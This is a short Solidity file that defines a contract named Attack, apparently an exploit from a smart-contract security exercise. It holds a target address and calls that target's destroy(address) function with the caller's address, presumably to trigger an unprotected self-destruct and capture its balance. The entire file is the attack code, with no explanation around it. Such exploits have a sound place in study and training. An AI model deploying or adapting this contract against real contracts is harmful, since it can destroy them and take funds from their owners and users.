// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    address public target;

    constructor(address _addr){
        target=_addr;
    }
    function attack() public{
        (bool ok,)=target.call(abi.encodeWithSignature("destroy(address)", msg.sender));
    }
}
